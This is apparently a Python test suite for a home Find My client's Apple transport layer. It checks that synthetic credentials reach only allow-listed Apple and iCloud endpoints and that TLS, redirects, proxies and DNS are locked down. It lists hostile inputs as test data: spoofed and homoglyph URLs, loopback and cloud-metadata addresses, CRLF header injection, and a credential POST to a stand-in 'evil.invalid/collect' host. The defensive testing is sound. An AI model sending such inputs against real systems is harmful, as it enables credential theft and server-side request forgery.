"""Credential routing tests: only synthetic secrets; no external network."""
import asyncio
from datetime import datetime,timedelta,timezone
import json
from pathlib import Path
import plistlib
import os
import socket
import ssl
import tempfile
from types import SimpleNamespace
import unittest
from unittest.mock import AsyncMock,Mock,patch
import aiohttp
from aiohttp import web
from aiohttp.test_utils import TestServer
from cryptography import x509
from cryptography.hazmat.primitives import hashes,serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import NameOID
from findmy_home.apple_transport import OwnedHttpSession,PublicResolver,Response,TransportBlocked,trust_context,validate_destination

AUTH_URL="https://gsa.apple.com/grandslam/GsService2"
class DestinationTests(unittest.TestCase):
    def test_explicit_apple_destinations_are_accepted(self):
        for profile,url in (("account",AUTH_URL),("account","https://setup.icloud.com/setup/iosbuddy/loginDelegates"),
            ("cloudkit","https://gateway.icloud.com/ckdatabase/api/client/record/sync"),
            ("cloudkit","https://gateway.icloud.com/setup/setup/ck/v1/ckAppInit?container=com.apple.icloud.searchparty"),
            ("escrow","https://p24-escrowproxy.icloud.com:443/escrowproxy/api/recover")):
            self.assertTrue(validate_destination(profile,"POST",url))
    def test_deceptive_or_noncanonical_urls_are_rejected(self):
        for url in (
            "http://gsa.apple.com/grandslam/GsService2", "https://gsa.apple.com.evil.invalid/grandslam/GsService2",
            "https://gsa.apple.com@evil.invalid/grandslam/GsService2", "https://evil.invalid@gsa.apple.com/grandslam/GsService2",
            "https://gsa.apple.com./grandslam/GsService2", "https://gsa.apple.com:8443/grandslam/GsService2",
            "https://gsa.apple.com:/grandslam/GsService2", "https://gsa.apple.com%2eevil.invalid/grandslam/GsService2",
            "https://gsa.apple.com/grandslam/%47sService2", AUTH_URL+"?token=PRIVATE",AUTH_URL+"#PRIVATE",AUTH_URL+"?",
            "https://gsa.apple.com\\@evil.invalid/grandslam/GsService2", "https://gsa.apple.com\n/grandslam/GsService2",
            "https://127.0.0.1/grandslam/GsService2", "https://[::1]/grandslam/GsService2",
            "https://gѕa.apple.com/grandslam/GsService2", "https://gsa.apple.com/other-path", None):
            with self.subTest(url=url),self.assertRaises(TransportBlocked) as caught:
                validate_destination("account","POST",url)
            self.assertEqual(str(caught.exception),"destination_blocked")
    def test_profiles_do_not_accept_other_services_or_write_paths(self):
        cases=[("cloudkit",AUTH_URL),("escrow",AUTH_URL),("account","https://p24-escrowproxy.icloud.com/escrowproxy/api/recover"),
            ("cloudkit","https://gateway.icloud.com/ckdatabase/api/client/record/save"),
            ("escrow","https://p24-escrowproxy.icloud.com/escrowproxy/api/delete"),
            ("escrow","https://p24-escrowproxy.icloud.com/escrowproxy/api/enroll"),
            ("escrow","https://p24-escrowproxy.icloud.com.evil.invalid/escrowproxy/api/recover")]
        for profile,url in cases:
            with self.subTest(profile=profile,url=url),self.assertRaises(TransportBlocked):validate_destination(profile,"POST",url)
        for query in ("container=unknown","container=com.apple.icloud.searchparty&token=PRIVATE","container=com.apple.icloud.searchparty&container=com.apple.security.keychain"):
            with self.assertRaises(TransportBlocked):validate_destination("cloudkit","POST","https://gateway.icloud.com/setup/setup/ck/v1/ckAppInit?"+query)
        with self.assertRaises(TransportBlocked):validate_destination("cloudkit","GET","https://gateway.icloud.com/ckdatabase/api/client/record/sync")
    def test_tls_cannot_be_disabled_and_trust_anchor_is_verified(self):
        context=trust_context()
        self.assertTrue(context.check_hostname)
        self.assertEqual(context.verify_mode,ssl.CERT_REQUIRED)
        self.assertGreaterEqual(context.minimum_version,ssl.TLSVersion.TLSv1_2)
        with self.assertRaises(TransportBlocked):OwnedHttpSession(verify_tls=False)
        with patch.object(Path,"read_text",return_value="tampered"):
            with self.assertRaises(TransportBlocked) as caught:trust_context()
        self.assertEqual(str(caught.exception),"trust_store_invalid")
    def test_tls_trust_store_does_not_follow_environment_override(self):
        with patch.dict(os.environ,{"SSL_CERT_FILE":"/does-not-exist/attacker-ca.pem","SSL_CERT_DIR":"/does-not-exist"}):
            context=trust_context()
        self.assertEqual(context.verify_mode,ssl.CERT_REQUIRED)
        self.assertTrue(context.check_hostname)

    def test_response_representation_is_redacted_and_plist_entities_rejected(self):
        value=Response(200,b"PRIVATE_BODY",{"token":"PRIVATE_TOKEN"})
        self.assertNotIn("PRIVATE",repr(value))
        self.assertEqual(Response(200,plistlib.dumps({"ok":True}),{}).plist(),{"ok":True})
        with self.assertRaises(TransportBlocked):Response(200,b'<!ENTITY secret "PRIVATE">',{}).plist()

class ResolverTests(unittest.IsolatedAsyncioTestCase):
    async def test_private_mixed_reserved_and_empty_dns_answers_fail(self):
        for addresses in ([],["127.0.0.1"],["::1"],["169.254.169.254"],["10.0.0.1"],["8.8.8.8","192.168.1.1"],["::ffff:127.0.0.1"],["not-an-ip"]):
            delegate=SimpleNamespace(resolve=AsyncMock(return_value=[{"host":value} for value in addresses]),close=AsyncMock())
            with patch("aiohttp.resolver.DefaultResolver",return_value=delegate):
                resolver=PublicResolver()
                with self.subTest(addresses=addresses),self.assertRaises(TransportBlocked):await resolver.resolve("gsa.apple.com",443)
                await resolver.close()
            delegate.close.assert_awaited_once()
    async def test_public_addresses_are_returned_without_re_resolving(self):
        values=[{"host":"8.8.8.8"},{"host":"2001:4860:4860::8888"}]
        delegate=SimpleNamespace(resolve=AsyncMock(return_value=values),close=AsyncMock())
        with patch("aiohttp.resolver.DefaultResolver",return_value=delegate):
            resolver=PublicResolver();self.assertIs(await resolver.resolve("gsa.apple.com",443),values);await resolver.close()
        delegate.resolve.assert_awaited_once()

class FakeResponse:
    def __init__(self,status=200,chunks=(b'{"ok":true}',)):
        self.status,self.headers=status,{}
        async def iter_chunked(size):
            for chunk in chunks:yield chunk
        self.content=SimpleNamespace(iter_chunked=iter_chunked)
    async def __aenter__(self):return self
    async def __aexit__(self,*args):pass

class TransportTests(unittest.IsolatedAsyncioTestCase):
    async def asyncSetUp(self):self.transport=OwnedHttpSession()
    async def asyncTearDown(self):await self.transport.close()
    async def test_blocked_destination_never_creates_a_session_or_sends_secrets(self):
        with patch.object(self.transport,"_session",AsyncMock()) as factory:
            with self.assertRaises(TransportBlocked):
                await self.transport.post("https://evil.invalid/collect",auth=("PRIVATE_USER","PRIVATE_TOKEN"),data=b"PRIVATE_PASSCODE")
        factory.assert_not_awaited()
    async def test_transport_escape_options_and_host_header_are_rejected_before_send(self):
        for kwargs in ({"allow_redirects":True},{"ssl":False},{"proxy":"http://evil.invalid"},{"headers":{"hOsT":"evil.invalid"}},{"headers":{"Host ":"evil.invalid"}},{"headers":{"X-Test":"bad\r\nPRIVATE"}}):
            with patch.object(self.transport,"_session",AsyncMock()) as factory:
                with self.subTest(kwargs=kwargs),self.assertRaises(TransportBlocked):await self.transport.post(AUTH_URL,**kwargs)
                factory.assert_not_awaited()
    async def test_redirects_are_blocked_without_retry_or_forwarding(self):
        for status in (301,302,303,307,308):
            session=SimpleNamespace(request=Mock(return_value=FakeResponse(status)),close=AsyncMock())
            with patch.object(self.transport,"_session",AsyncMock(return_value=session)):
                with self.subTest(status=status),self.assertRaises(TransportBlocked) as caught:
                    await self.transport.post(AUTH_URL,auth=("fixture","PRIVATE_TOKEN"),data=b"PRIVATE_BODY",auto_retry=True)
            self.assertEqual(str(caught.exception),"redirect_blocked")
            session.request.assert_called_once()
            self.assertFalse(session.request.call_args.kwargs["allow_redirects"])
    async def test_request_errors_are_redacted_and_not_retried(self):
        session=SimpleNamespace(request=Mock(side_effect=aiohttp.ClientConnectionError("PRIVATE_UPSTREAM_URL")))
        with patch.object(self.transport,"_session",AsyncMock(return_value=session)):
            with self.assertRaises(TransportBlocked) as caught:await self.transport.post(AUTH_URL,auto_retry=True)
        self.assertEqual(str(caught.exception),"request_failed")
        session.request.assert_called_once()
    async def test_response_size_is_bounded(self):
        self.transport.MAX_BODY=4
        session=SimpleNamespace(request=Mock(return_value=FakeResponse(chunks=[b"123",b"456"])))
        with patch.object(self.transport,"_session",AsyncMock(return_value=session)):
            with self.assertRaises(TransportBlocked) as caught:await self.transport.post(AUTH_URL)
        self.assertEqual(str(caught.exception),"response_too_large")
    async def test_per_host_sessions_disable_environment_proxy_and_cookies(self):
        session=SimpleNamespace(close=AsyncMock())
        resolver=SimpleNamespace(close=AsyncMock())
        with patch("findmy_home.apple_transport.PublicResolver",return_value=resolver),patch("aiohttp.TCPConnector") as connector,patch("aiohttp.ClientSession",return_value=session) as make:
            first=await self.transport._session("gsa.apple.com")
            self.assertIs(await self.transport._session("gsa.apple.com"),first)
            self.assertFalse(make.call_args.kwargs["trust_env"])
            self.assertIsInstance(make.call_args.kwargs["cookie_jar"],aiohttp.DummyCookieJar)
            self.assertTrue(connector.call_args.kwargs["force_close"])
            await self.transport.close()
        session.close.assert_awaited_once();resolver.close.assert_awaited_once()
    async def test_closed_transport_will_not_create_a_new_session(self):
        await self.transport.close()
        with patch.object(self.transport,"_session",AsyncMock()) as factory:
            with self.assertRaises(TransportBlocked):await self.transport.post(AUTH_URL)
            factory.assert_not_awaited()

def fixture_tls(tmp):
    key=rsa.generate_private_key(public_exponent=65537,key_size=2048)
    name=x509.Name([x509.NameAttribute(NameOID.COMMON_NAME,"gsa.apple.com")])
    now=datetime.now(timezone.utc)
    cert=(x509.CertificateBuilder().subject_name(name).issuer_name(name).public_key(key.public_key()).serial_number(x509.random_serial_number())
        .not_valid_before(now-timedelta(minutes=1)).not_valid_after(now+timedelta(days=1))
        .add_extension(x509.SubjectAlternativeName([x509.DNSName("gsa.apple.com")]),critical=False).sign(key,hashes.SHA256()))
    cert_path=Path(tmp)/"fixture.pem";key_path=Path(tmp)/"fixture-key.pem"
    cert_path.write_bytes(cert.public_bytes(serialization.Encoding.PEM))
    key_path.write_bytes(key.private_bytes(serialization.Encoding.PEM,serialization.PrivateFormat.PKCS8,serialization.NoEncryption()))
    server_tls=ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER);server_tls.load_cert_chain(cert_path,key_path)
    client_tls=ssl.create_default_context(cafile=str(cert_path))
    return server_tls,client_tls

class RealRedirectTests(unittest.IsolatedAsyncioTestCase):
    async def test_real_https_redirect_does_not_forward_body_or_credentials(self):
        # DNS/TLS are deliberately replaced only inside this test to reach local
        # fixture servers. Production public-IP filtering is tested separately.
        with tempfile.TemporaryDirectory() as tmp:
            server_tls,client_tls=fixture_tls(tmp)
            forwarded=[];received=[]
            async def sink(request):forwarded.append(await request.read());return web.Response(text="unexpected")
            target_app=web.Application();target_app.router.add_post("/sink",sink)
            target=TestServer(target_app);await target.start_server()
            async def redirect(request):
                received.append((request.headers.get("Authorization"),await request.read()))
                return web.Response(status=307,headers={"Location":str(target.make_url("/sink"))})
            source_app=web.Application();source_app.router.add_post("/grandslam/GsService2",redirect)
            source=TestServer(source_app,scheme="https");await source.start_server(ssl=server_tls)
            class FixtureResolver(aiohttp.abc.AbstractResolver):
                async def resolve(self,host,port=0,family=socket.AF_INET):
                    return [{"hostname":host,"host":"127.0.0.1","port":source.port,"family":socket.AF_INET,"proto":0,"flags":0}]
                async def close(self):pass
            transport=OwnedHttpSession();transport._ssl=client_tls
            session=aiohttp.ClientSession(connector=aiohttp.TCPConnector(resolver=FixtureResolver()),trust_env=False)
            transport._sessions["gsa.apple.com"]=session
            try:
                with self.assertRaises(TransportBlocked) as caught:
                    await transport.post(AUTH_URL,auth=("synthetic-user","synthetic-token"),data=b"synthetic-passcode")
                self.assertEqual(str(caught.exception),"redirect_blocked")
                self.assertEqual(received,[(aiohttp.BasicAuth("synthetic-user","synthetic-token").encode(),b"synthetic-passcode")])
                self.assertEqual(forwarded,[])
            finally:
                await transport.close();await source.close();await target.close()

    async def test_untrusted_tls_peer_never_receives_the_credential_request(self):
        with tempfile.TemporaryDirectory() as tmp:
            server_tls,_=fixture_tls(tmp)
            received=[]
            async def handler(request):
                received.append(await request.read());return web.Response(text="unexpected")
            app=web.Application();app.router.add_post("/grandslam/GsService2",handler)
            server=TestServer(app,scheme="https");await server.start_server(ssl=server_tls)
            class FixtureResolver(aiohttp.abc.AbstractResolver):
                async def resolve(self,host,port=0,family=socket.AF_INET):
                    return [{"hostname":host,"host":"127.0.0.1","port":server.port,"family":socket.AF_INET,"proto":0,"flags":0}]
                async def close(self):pass
            transport=OwnedHttpSession()
            transport._sessions["gsa.apple.com"]=aiohttp.ClientSession(connector=aiohttp.TCPConnector(resolver=FixtureResolver()),trust_env=False)
            try:
                with self.assertRaises(TransportBlocked) as caught:
                    await transport.post(AUTH_URL,auth=("synthetic-user","synthetic-token"),data=b"synthetic-passcode")
                self.assertEqual(str(caught.exception),"request_failed")
                self.assertEqual(received,[])
            finally:await transport.close();await server.close()
